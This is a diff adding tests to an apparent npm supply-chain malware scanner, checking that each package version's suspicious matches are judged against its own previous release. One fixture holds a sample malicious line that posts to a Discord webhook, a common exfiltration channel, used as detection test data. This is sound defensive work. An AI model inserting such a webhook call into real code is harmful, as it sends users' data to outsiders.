@@ -562,3 +562,101 @@ def test_a_test_or_docs_file_the_package_loads_is_not_taken_for_one(tmp_path: Pa
     assert found["lib/util.spec.js"].severity is Severity.HIGH
     assert found["test/setup.js"].severity is Severity.HIGH
     assert found["test/other.js"].severity is Severity.LOW
+
+
+# Round 9 (S2): each version's matches are judged against its own previous release.
+BAD_REBUILT = BAD | {
+    "lib/x.js": b"post('https://discord.com/api/webhooks/1093847562019384756/y') // rebuilt"
+}
+
+
+def chained(*versions: tuple[str, str | None]) -> tuple[Candidate, ...]:
+    """Candidates whose `previous` is the named version (None: a new package)."""
+    return tuple(
+        Candidate(
+            change=Change(
+                new=snapshot(version, i), previous=snapshot(previous) if previous else None
+            )
+        )
+        for i, (version, previous) in enumerate(versions)
+    )
+
+
+def chain_batch(base: str | None, *versions: tuple[str, str | None]) -> PackageBatch:
+    return PackageBatch(
+        ecosystem="npm",
+        name="kx",
+        base=snapshot(base) if base else None,
+        versions=chained(*versions),
+    )
+
+
+def test_a_later_version_is_compared_with_its_own_previous_release() -> None:
+    """`@blod-nm/nuxt-mcp@0.1.7` (live, 2026-11-12) rebuilt 0.1.6's obfuscated files in the same
+    run: compared with the batch's base, which had none, it was MEDIUM again."""
+    trees = {"1.0.0": BASE, "1.0.1": BAD, "1.0.2": BAD_REBUILT}
+    result = analyse_batch(
+        chain_batch("1.0.0", ("1.0.1", "1.0.0"), ("1.0.2", "1.0.1")),
+        lambda s: trees[s.ref.version],
+        ContentCache(None, RULES),
+    )
+    first, rebuilt = result.versions
+    assert first.history[-1].forwarded
+    assert not rebuilt.history[-1].forwarded and rebuilt.history[-1].reason == "no signal"
+    assert {f.severity for f in rebuilt.findings} == {Severity.LOW}
+    assert all(f.explanation.endswith("not new in this release.") for f in rebuilt.findings)
+
+
+def test_a_match_new_against_the_own_previous_release_stays() -> None:
+    """A clean release in the batch, then one that adds the match: still flagged, even though
+    the batch's base had it (an injected payload after a clean-up)."""
+    trees = {"1.0.0": BAD, "1.0.1": CLEAN, "1.0.2": BAD_REBUILT}
+    result = analyse_batch(
+        chain_batch("1.0.0", ("1.0.1", "1.0.0"), ("1.0.2", "1.0.1")),
+        lambda s: trees[s.ref.version],
+        ContentCache(None, RULES),
+    )
+    assert result.versions[1].history[-1].forwarded
+
+
+def test_a_previous_release_outside_the_batch_is_read() -> None:
+    """Two release lines in one run (`@aglit-ai/cli` `1.0.x-staging` beside `5.0.x-runtime`):
+    the batch's base is the other line's release, the version's own previous is not in the
+    batch. Unavailable, the base is used and the reason says so."""
+    trees: dict[str, dict[str, bytes] | Unavailable] = {
+        "5.0.0": Unavailable(reason="declared unpacked size 67109197 bytes"),
+        "1.0.4": BAD,
+        "1.0.5": BAD_REBUILT,
+        "5.0.1": CLEAN,
+    }
+    read: list[str] = []
+
+    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
+        read.append(s.ref.version)
+        return trees[s.ref.version]
+
+    lines = chain_batch("5.0.0", ("1.0.5", "1.0.4"), ("5.0.1", "5.0.0"))
+    staging, _ = analyse_batch(lines, files, ContentCache(None, RULES)).versions
+    assert not staging.history[-1].forwarded
+    assert staging.history[-1].reason.startswith("no signal; base unavailable: declared")
+    assert read == ["5.0.0", "1.0.5", "1.0.4", "5.0.1"]
+    trees["1.0.4"] = Unavailable(reason="TransientFetchError: x", transient=True)
+    staging, _ = analyse_batch(lines, files, ContentCache(None, RULES)).versions
+    assert staging.history[-1].forwarded
+    assert staging.history[-1].reason.endswith(
+        "; previous 1.0.4 unavailable, will retry: TransientFetchError: x"
+    )
+    assert needs_retry([PackageBatch(ecosystem="npm", name="kx", base=None, versions=(staging,))])
+
+
+def test_a_new_package_burst_compares_later_versions_with_earlier_ones() -> None:
+    """No base (a new package), but the second version's previous is the first: its rebuilt
+    match is not new (`@blod-nm/ak@0.1.1` after `0.1.0` in one run)."""
+    trees = {"0.1.0": BAD, "0.1.1": BAD_REBUILT}
+    result = analyse_batch(
+        chain_batch(None, ("0.1.0", None), ("0.1.1", "0.1.0")),
+        lambda s: trees[s.ref.version],
+        ContentCache(None, RULES),
+    )
+    first, second = result.versions
+    assert first.history[-1].forwarded and not second.history[-1].forwarded
